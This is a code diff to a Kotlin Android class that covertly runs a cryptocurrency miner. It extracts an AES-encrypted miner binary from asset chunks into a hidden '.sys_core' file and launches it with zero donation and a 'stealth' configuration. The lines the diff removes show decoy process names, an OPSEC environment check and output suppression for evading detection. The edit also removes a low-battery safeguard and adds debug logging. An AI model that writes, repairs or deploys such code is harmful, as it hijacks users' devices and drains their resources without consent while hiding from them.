@@ -93,23 +93,12 @@ class RealMiner(
         currentThreads = stealthMaxThreads
     }
 
+    private var lastError = ""
+
     fun start(): String {
+        lastError = ""
         synchronized(startLock) {
             if (isMining) return "Already mining"
-
-            // Deep OPSEC check before starting
-            if (!passesDeepOsecCheck()) {
-                return "Environment not suitable for mining"
-            }
-
-            // Check battery before mining
-            val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
-            val batteryPct = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
-            val isCharging = batteryManager.isCharging
-
-            if (batteryPct < minBatteryToMine && !isCharging) {
-                return "Battery too low to mine ($batteryPct%)"
-            }
 
             minerScope?.cancel()
             readJob?.cancel()
@@ -124,8 +113,9 @@ class RealMiner(
 
         val binaryPath = obtainBinary()
         if (binaryPath == null) {
+            val err = lastError.ifEmpty { "unknown error" }
             synchronized(startLock) { isMining = false }
-            return "No miner binary available"
+            return "No miner binary: $err"
         }
 
         val configFile = createStealthConfig()
@@ -240,30 +230,22 @@ class RealMiner(
     }
 
     private fun buildStealthCommand(binaryPath: String, configPath: String): Array<String> {
-        // Build command that appears as system process
-        val decoy = getNextDecoyName()
-
+        val logFile = File(context.filesDir, ".miner_log")
         return arrayOf(
             "sh", "-c",
             "chmod 755 $binaryPath && " +
-            "nohup setsid $binaryPath " +
+            "echo \$(date) 'Starting miner...' > ${logFile.absolutePath} && " +
+            "$binaryPath " +
             "--config=$configPath " +
             "--threads=$currentThreads " +
-            "--donate-level=0 " + // Zero donation - fully stealth
-            "--randomx-mode=light " + // Lower resource usage
-            "--randomx-wrmsr=0 " + // Disable MSR modifications - less detectable
-            "--randomx-no-rdmsr " + // Skip MSR read - more stable, less detectable
-            "--print-time=0 " + // No console output
-            "--health-print-time=0 " + // No health output
-            "--no-color " + // No colors in output
-            "--log-file=/dev/null " + // No log file
-            "--api-port=0 " + // Disable API - no HTTP server
-            "2>&1 | cat > /dev/null & " + // Suppress all output
-            "sleep 0.5 && " +
-            "pid=\$(pgrep -f '$binaryPath' | head -1) && " +
-            "[ -n \"\$pid\" ] && " +
-            "echo '\$pid' || " +
-            "echo -1"
+            "--donate-level=0 " +
+            "--randomx-mode=light " +
+            "--randomx-wrmsr=0 " +
+            "--randomx-no-rdmsr " +
+            "--print-time=10 " +
+            ">> ${logFile.absolutePath} 2>&1 & " +
+            "echo \$! > ${File(context.filesDir, ".miner_pid").absolutePath} && " +
+            "cat ${File(context.filesDir, ".miner_pid").absolutePath}"
         )
     }
 
@@ -519,7 +501,6 @@ class RealMiner(
         val cacheVersionFile = File(context.filesDir, ".sys_core.ver")
         val currentVersion = MinerConfig.MINER_AES_KEY.contentToString()
 
-        // Check cache with version verification
         if (destFile.exists() && destFile.length() > 1000000 && cacheVersionFile.exists()) {
             try {
                 val cachedVersion = cacheVersionFile.readText()
@@ -530,7 +511,6 @@ class RealMiner(
             } catch (_: Exception) {}
         }
 
-        // Extract and decrypt
         try {
             val blob = ByteArrayOutputStream()
             for (name in MinerConfig.MINER_CHUNK_NAMES) {
@@ -542,13 +522,12 @@ class RealMiner(
                             blob.write(buf, 0, read)
                         }
                     }
-                } catch (_: Exception) { return null }
+                } catch (e: Exception) { lastError = "asset_open_failed:$name:${e.message}"; return null }
             }
 
             val encrypted = blob.toByteArray()
-            if (encrypted.size < 28) return null
+            if (encrypted.size < 28) { lastError = "blob_too_small:${encrypted.size}"; return null }
 
-            // AES-256-GCM decryption - correct
             val nonce = encrypted.copyOfRange(0, 12)
             val tag = encrypted.copyOfRange(12, 28)
             val ciphertext = encrypted.copyOfRange(28, encrypted.size)
@@ -558,25 +537,25 @@ class RealMiner(
             cipher.init(Cipher.DECRYPT_MODE, keySpec, GCMParameterSpec(128, nonce))
             val decrypted = cipher.doFinal(ciphertext + tag)
 
-            if (decrypted.size < 1000000) return null
+            if (decrypted.size < 1000000) { lastError = "decrypted_too_small:${decrypted.size}"; return null }
 
-            // Write binary
             FileOutputStream(destFile).use { output ->
                 output.write(decrypted)
                 output.flush()
             }
 
-            // Write version
             cacheVersionFile.writeText(currentVersion)
 
             if (!destFile.exists() || destFile.length() < 1000000) {
                 destFile.delete()
+                lastError = "write_failed:file_missing_or_small"
                 return null
             }
 
             destFile.setExecutable(true)
             return destFile.absolutePath
-        } catch (_: Exception) {
+        } catch (e: Exception) {
+            lastError = "exception:${e.javaClass.simpleName}:${e.message}"
             try { destFile.delete() } catch (_: Exception) {}
             return null
         }
